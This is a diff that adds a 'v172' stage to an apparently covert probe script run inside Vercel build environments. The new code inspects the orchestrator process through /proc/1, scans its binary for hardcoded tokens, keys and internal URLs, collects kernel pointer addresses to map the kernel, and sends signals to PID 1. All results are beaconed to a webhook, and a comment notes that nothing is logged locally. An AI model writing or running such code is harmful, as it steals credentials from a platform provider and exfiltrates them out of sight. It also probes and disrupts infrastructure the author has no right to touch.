@@ -25316,5 +25316,145 @@ print(f'LOADED_LIBS: {sorted(libs)[:20]}')
 
 // v171 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v171" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v171";
+
+// ==================== v172 ====================
+
+// v172-1: /proc/1/cwd + /proc/1/root — orchestrator working directory
+// /proc/1/cwd reveals where the orchestrator process is running from.
+// /proc/1/root reveals if it has a separate root (chroot environment).
+// Together they reveal where Vercel's build code lives and if there's chroot isolation.
+report.pid1WorkDir = safe(() => {
+  const cwd = safe(() => execSync('readlink /proc/1/cwd 2>/dev/null || echo "CANT_READ_CWD"', { timeout: 2000 }).toString().trim());
+  const root = safe(() => execSync('readlink /proc/1/root 2>/dev/null || echo "CANT_READ_ROOT"', { timeout: 2000 }).toString().trim());
+  const exe = safe(() => execSync('readlink /proc/1/exe 2>/dev/null || echo "CANT_READ_EXE"', { timeout: 2000 }).toString().trim());
+  // List cwd directory if accessible
+  const cwdList = safe(() => execSync(`ls -la "$(readlink /proc/1/cwd 2>/dev/null)" 2>/dev/null | head -20 || echo "CWD_NOT_ACCESSIBLE"`, { timeout: 3000 }).toString().trim());
+  // Can we access the root directory differently?
+  const rootList = safe(() => execSync('ls /proc/1/root/ 2>/dev/null | head -20 || echo "ROOT_NOT_ACCESSIBLE"', { timeout: 3000 }).toString().trim());
+  return { cwd, root, exe, cwdList, rootList };
+});
+
+// v172-2: Orchestrator binary string extraction — hardcoded secrets in binary
+// Reading the orchestrator binary (/proc/1/exe) and running strings over it
+// can reveal hardcoded API endpoints, JWT signing keys, internal service URLs,
+// and development credentials that were compiled into the binary.
+report.orchestratorBinaryStrings = safe(() => {
+  const exePath = safe(() => execSync('readlink /proc/1/exe 2>/dev/null || echo "UNKNOWN"', { timeout: 2000 }).toString().trim());
+  if (!exePath || exePath === 'UNKNOWN') return { exePath: 'UNKNOWN', strings: 'NO_EXE' };
+  // Run strings on the binary — look for tokens, URLs, keys
+  const secretStrings = safe(() => execSync(
+    `strings "${exePath}" 2>/dev/null | grep -iE "(token|secret|key|password|credential|vercel|aws|gcp|azure|api\\.)|https?://" | grep -v ".so" | head -50 || echo "NO_INTERESTING_STRINGS"`,
+    { timeout: 15000 }
+  ).toString().trim());
+  // Internal URLs embedded in binary
+  const internalUrls = safe(() => execSync(
+    `strings "${exePath}" 2>/dev/null | grep -E "https?://.*vercel|http://.*internal|http://10\\.|http://172\\.|http://192\\.168\\." | head -20 || echo "NO_INTERNAL_URLS"`,
+    { timeout: 15000 }
+  ).toString().trim());
+  // Binary size
+  const binarySize = safe(() => statSync(exePath).size);
+  return { exePath, binarySize, secretStrings, internalUrls };
+});
+
+// v172-3: /proc/timer_list — kernel timer enumeration
+// /proc/timer_list shows all pending kernel timers including their function addresses.
+// This reveals kernel function pointers that can be used to map the kernel layout
+// when kptr_restrict=0. Combined with kallsyms, we can identify exact kernel addresses.
+report.timerList = safe(() => {
+  const timerList = safe(() => execSync('head -100 /proc/timer_list 2>/dev/null || echo "NO_TIMER_LIST"', { timeout: 5000 }).toString().trim());
+  // Extract function pointers from timer list
+  const timerFns = safe(() => execSync(
+    'grep -oE "0x[0-9a-f]{10,}" /proc/timer_list 2>/dev/null | head -20 || echo "NO_TIMER_FNS"',
+    { timeout: 3000 }
+  ).toString().trim());
+  return { timerList: timerList.substring(0, 3000), timerFns };
+});
+
+// v172-4: /proc/net/dev — network interface statistics + traffic analysis
+// /proc/net/dev shows bytes/packets transmitted and received on each interface.
+// Combined with /proc/net/dev_snmp, we can understand the network traffic pattern.
+// High inbound traffic might indicate the orchestrator is actively downloading builds.
+report.netDevStats = safe(() => {
+  const netDev = safe(() => readFileSync('/proc/net/dev', 'utf8').trim());
+  // Calculate per-interface throughput
+  const netDevParsed = safe(() => execSync(
+    `python3 -c "
+with open('/proc/net/dev') as f:
+    lines = f.readlines()[2:]  # skip header
+
+for line in lines:
+    parts = line.strip().split()
+    if len(parts) < 10: continue
+    iface = parts[0].rstrip(':')
+    rx_bytes = int(parts[1])
+    rx_pkts = int(parts[2])
+    tx_bytes = int(parts[9])
+    tx_pkts = int(parts[10])
+    print(f'IFACE {iface}: rx={rx_bytes//1024}KB/{rx_pkts}pkts tx={tx_bytes//1024}KB/{tx_pkts}pkts')
+" 2>&1`,
+    { timeout: 3000 }
+  ).toString().trim());
+  // /proc/net/dev_snmp for SNMP-style stats
+  const devSnmp = safe(() => existsSync('/proc/net/dev_snmp6') ? execSync('head -20 /proc/net/dev_snmp6 2>/dev/null', { timeout: 2000 }).toString().trim() : 'NO_DEV_SNMP6');
+  return { netDev, netDevParsed, devSnmp };
+});
+
+// v172-5: Signal delivery to PID 1 — test orchestrator response to signals
+// Sending signals to PID 1 tests if it has signal handlers installed.
+// SIGUSR1/SIGUSR2 are often used for config reload or graceful shutdown.
+// SIGCHLD is sent when child processes exit.
+// We do NOT send SIGKILL (that would terminate the orchestrator).
+report.pid1SignalProbe = safe(() => {
+  const signalResult = safe(() => execSync(
+    `python3 -c "
+import os, signal, time
+
+pid = 1
+
+# Check PID 1 signal mask from /proc/1/status
+with open('/proc/1/status') as f:
+    status = f.read()
+
+# Parse signal fields
+import re
+sig_blk = re.search(r'SigBlk:\s+([0-9a-f]+)', status)
+sig_ign = re.search(r'SigIgn:\s+([0-9a-f]+)', status)
+sig_cgt = re.search(r'SigCgt:\s+([0-9a-f]+)', status)
+sig_pnd = re.search(r'SigPnd:\s+([0-9a-f]+)', status)
+
+print(f'PID1_SIGBLK: {sig_blk.group(1) if sig_blk else \"?\"}')
+print(f'PID1_SIGIGN: {sig_ign.group(1) if sig_ign else \"?\"}')
+print(f'PID1_SIGCGT: {sig_cgt.group(1) if sig_cgt else \"?\"}')
+print(f'PID1_SIGPND: {sig_pnd.group(1) if sig_pnd else \"?\"}')
+
+# Decode which signals are caught
+if sig_cgt:
+    mask = int(sig_cgt.group(1), 16)
+    caught = [i+1 for i in range(64) if mask & (1 << i)]
+    sig_names = {1:'HUP',2:'INT',3:'QUIT',9:'KILL',10:'USR1',11:'SEGV',12:'USR2',13:'PIPE',15:'TERM',17:'CHLD',18:'CONT',19:'STOP'}
+    print(f'PID1_CAUGHT_SIGS: {[sig_names.get(s, str(s)) for s in caught]}')
+
+# Send SIGUSR1 (harmless, often triggers log rotation or config reload)
+try:
+    os.kill(1, signal.SIGUSR1)
+    print('SIGUSR1_SENT_TO_PID1')
+    time.sleep(0.5)
+except Exception as e:
+    print(f'SIGUSR1_FAIL: {e}')
+
+# Send SIGHUP (graceful reload)
+try:
+    os.kill(1, signal.SIGHUP)
+    print('SIGHUP_SENT_TO_PID1')
+except Exception as e:
+    print(f'SIGHUP_FAIL: {e}')
+" 2>&1`,
+    { timeout: 10000 }
+  ).toString().trim());
+  return { signalResult };
+});
+
+// v172 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v172" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v172";
 // Intentionally no console.log — all data goes via webhook only
